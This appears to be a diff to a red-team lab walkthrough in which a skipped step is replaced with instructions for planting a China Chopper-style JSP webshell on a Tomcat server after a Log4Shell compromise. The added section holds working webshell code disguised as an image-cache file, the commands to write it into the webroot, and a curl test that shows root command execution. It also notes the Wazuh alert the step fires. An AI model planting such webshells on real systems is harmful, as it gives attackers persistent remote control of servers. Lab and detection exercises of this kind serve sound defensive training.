@@ -346,26 +346,55 @@ Two things to keep in mind with the dumb shell:
   avoid signals altogether.
 - Pipes and semicolons work normally: `id; whoami; hostname`
 
-### 2.2 JSP Webshell — Not Applicable for This Target
+### 2.2 Deploy JSP Webshell (China Chopper Pattern)
 
-The `christophetd/log4shell-vulnerable-app` runs as a **Spring Boot fat JAR** with embedded Tomcat.
-There is no `webapps/` directory on the filesystem — all static content lives inside the JAR.
-JSP webshell deployment requires a writable webroot exposed by the HTTP server, which does not exist here.
+**Why this path:** The lab uses Tomcat 9.0.54 with the log4shell WAR deployed to `webapps/ROOT/`.
+Tomcat extracts the WAR at startup, giving a real writable webroot at `/opt/tomcat/webapps/ROOT/`.
+Writing a JSP there makes it immediately accessible via the HTTP server.
+The China Chopper one-liner pattern is extensively documented in APT41 intrusions.
 
 ```bash
 [WEB01]
-# Confirm: no webapps directory
-find / -name "webapps" -type d 2>/dev/null | grep -v proc
-# (no output)
+# Confirm the webroot exists and is writable
+ls /opt/tomcat/webapps/ROOT/
+# WEB-INF/  static/  ...
 
-# Confirm: app runs from a fat JAR
-ls /app/
-# spring-webmvc-demo.jar  (or similar)
+# Create a plausible-looking directory path
+mkdir -p /opt/tomcat/webapps/ROOT/resources/imgs
+
+# Write the webshell — one-liner, parameter-driven execution
+cat > /opt/tomcat/webapps/ROOT/resources/imgs/cache.jsp << 'JSPEOF'
+<%@page import="java.util.*,java.io.*"%><%
+String cmd = request.getParameter("c");
+if(cmd != null && !cmd.isEmpty()) {
+    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
+    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    StringBuilder sb = new StringBuilder();
+    String line;
+    while((line = br.readLine()) != null) sb.append(line).append("\n");
+    out.print(sb.toString());
+}
+%>
+JSPEOF
+
+ls -la /opt/tomcat/webapps/ROOT/resources/imgs/cache.jsp
 ```
 
-**In a real engagement** against a traditional Tomcat deployment (`/opt/tomcat/webapps/ROOT/`),
-the China Chopper JSP webshell — a one-liner documented in APT41 intrusions — would be written here.
-This lab skips that step. Proceed directly to §2.3 to deploy the RxPhage implant via the reverse shell.
+**Test the webshell from Kali:**
+```bash
+[KALI]
+curl -s "http://10.0.0.100:8080/resources/imgs/cache.jsp?c=id%3Bwhoami%3Bhostname"
+```
+
+**Expected:**
+```
+uid=0(root) gid=0(root) groups=0(root)
+root
+web01
+```
+
+**SIEM alert fired:**
+- Wazuh: File created in Tomcat webroot — **HIGH**
 
 ### 2.3 Deploy RxPhage Implant
 
